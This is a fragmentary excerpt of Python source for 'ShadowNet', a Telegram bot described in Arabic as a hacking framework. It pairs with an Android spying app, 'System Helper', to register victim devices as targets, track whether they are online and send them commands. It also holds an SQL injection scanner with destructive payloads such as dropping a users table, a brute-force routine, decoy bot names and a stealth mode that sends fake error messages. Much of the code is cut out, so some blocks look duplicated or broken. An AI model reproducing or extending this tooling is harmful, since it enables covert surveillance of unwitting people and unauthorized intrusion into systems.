...
"""
ShadowNet Framework v4.2 - نظام الاختراق المتكامل
متوافق مع تطبيق System Helper (Android)
يعرض حالة الأجهزة المتصلة فوراً
"""
...
def register_target(device_id, chat_id, name, device_type, ip=None, os_name=None):
    with get_db_connection() as conn:
        ...
        c.execute('''INSERT OR REPLACE INTO targets 
                     (device_id, chat_id, name, type, ip, os, created_at, last_seen, status)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, name, device_type, ip, os_name, 
                   datetime.now().isoformat(), datetime.now().isoformat(), 'online'))
        conn.commit()
        logger.info(f"📱 جهاز جديد مسجل: {name} ({device_id})")
        notify_admin(f"📱 **جهاز جديد متصل!**\n📛 الاسم: {name}\n🆔 المعرف: `{device_id}`\n📱 النوع: {device_type}")
...
def download_video(url):
    ...
    try:
        ...
        return None, f"⚠️ فشل التحميل: {str(e)[:100]}"
...
def smart_pdf_search(text, question):
    ...
    if scored_paragraphs:
        ...
        return "⚠️ لم يتم العثور على إجابة مناسبة في الملف."
...
def port_scan(host, ports=None):
    ...
    results = {'host': host, 'open_ports': [], 'scanned': []}
    try:
...
def sql_injection_scan(url):
    ...
    payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--", "' AND 1=1--", "' AND 1=2--"]
    parsed = urlparse(url)
    if parsed.query:
            ...
            for payload in payloads:
                ...
                try:
                    ...
                    if "mysql" in response.text.lower() or "sql" in response.text.lower():
                        ...
                        results['findings'].append({'parameter': key, 'payload': payload, 'evidence': 'خطأ SQL في الاستجابة'})
                        break
                except:
                    pass
    return results
            ...
            for payload in payloads:
                ...
                try:
                    ...
                    if payload in response.text:
                        results['vulnerable'] = True
                        results['findings'].append({'parameter': key, 'payload': payload})
                        break
                except:
                    pass
    return results
...
def comprehensive_scan(url):
    results = {'url': url, 'technologies': {}, 'headers': {}, 'vulnerabilities': [], 'risk_level': '🟢 منخفض'}
    try:
...
def brute_force(target, service, username=None, wordlist=None):
    results = {'target': target, 'service': service, 'success': False, 'credentials': None, 'attempts': 0}
    if not wordlist:
...
def check_link_safety(url):
    try:
        ...
        if VIRUSTOTAL_API_KEY:
            try:
                from .utils import check_domain_virustotal
...
BOT_NAMES = ["System Scanner", "Security Checker", "Network Tool", "File Manager", "PDF Reader", "Help Desk", "Support Bot"]
...
def stealth_mode(chat_id):
    ...
    try:
        ...
        pass
    for _ in range(3):
        fake_messages = ["⚠️ حدث خطأ في النظام، يرجى المحاولة لاحقاً.", "📡 جاري تحديث قاعدة البيانات...", "🔍 فحص الأمان قيد التشغيل..."]
...
def detect_suspicious(user_id, command, user_data=None):
    suspicious_commands = ["eval", "exec", "os.system", "subprocess", "__import__", "globals", "locals", "getattr", "setattr", "delattr", "open", "file", "compile", "execfile", "input", "raw_input", "exit", "quit", "help", "dir"]
    is_suspicious = False
    reason = ""
...
def set_feature_permission(user_id, feature_name, enabled=True, hidden=False):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO user_permissions (user_id, feature_name, enabled, hidden) VALUES (?, ?, ?, ?)''',
...
# ===================== قائمة التحكم الخفي (مع حالة الاتصال) =====================
    ...
    if not targets:
        ...
        for target in targets:
            ...
            markup.row(InlineKeyboardButton(
                f"{status_icon} {name} ({short_id}) - {status_text}",
...
• الأجهزة - عرض جميع الأجهزة وحالتها

📱 **التطبيق المتوافق:**
• System Helper - تطبيق Android للتجسس
• يظهر فوراً عند تشغيله في قائمة الأجهزة
• يمكنك إرسال أوامر له مباشرة
...
def callback_query(call):
    ...
    if data == "stealth_status":
        ...
        if not targets:
            ...
            msg = "📊 **حالة الأجهزة:**\n\n"
            for target in targets:
                last_seen = target.get('last_seen', 'غير معروف')
                status = target.get('status', 'offline')
                is_online = False
                if last_seen != 'غير معروف':
                    try:
                        ...
                        pass
                status_text = "🟢 متصل" if is_online else "🔴 غير متصل"
                msg += f"📱 **{target.get('name', 'غير معروف')}**\n"
                msg += f"   🆔 `{target['device_id']}`\n"
                msg += f"   📡 الحالة: {status_text}\n"
                msg += f"   🕐 آخر ظهور: {last_seen[:16] if last_seen != 'غير معروف' else 'غير معروف'}\n"
                msg += f"   📱 النوع: {target.get('type', 'غير معروف')}\n\n"
    ...
    if data == "admin_permissions" and is_admin_user:
        users = get_all_targets()
        if not users:
            safe_send(chat_id, "📭 لا يوجد مستخدمين.")
        else:
            msg = "🔑 **إدارة الصلاحيات (قيد التطوير)**\n\n"
            for u in users:
                msg += f"👤 {u.get('name', 'غير معروف')} - {u.get('device_id', '')[:8]}...\n"
            safe_send(chat_id, msg)
        return
            ...
            for target in targets:
                ...
                if last_seen != 'غير معروف':
                    try:
                        ...
                        pass
                status = "🟢 متصل" if is_online else "🔴 غير متصل"
                msg += f"{status} **{target.get('name', 'غير معروف')}**\n"
                msg += f"   🆔 `{target['device_id']}`\n"
                msg += f"   📱 النوع: {target.get('type', 'غير معروف')}\n"
                msg += f"   🕐 آخر ظهور: {last_seen[:16] if last_seen != 'غير معروف' else 'غير معروف'}\n\n"
            safe_send(chat_id, msg)
...
def handle_text_messages(message):
    ...
    try:
        ...
        if state == "waiting_for_email_guess":
            ...
            valid = [e for e in found if len(e) % 5 == 0]
...
def register_device():
    try:
        ...
        logger.info(f"📥 طلب تسجيل جهاز جديد: {name} ({device_id})")
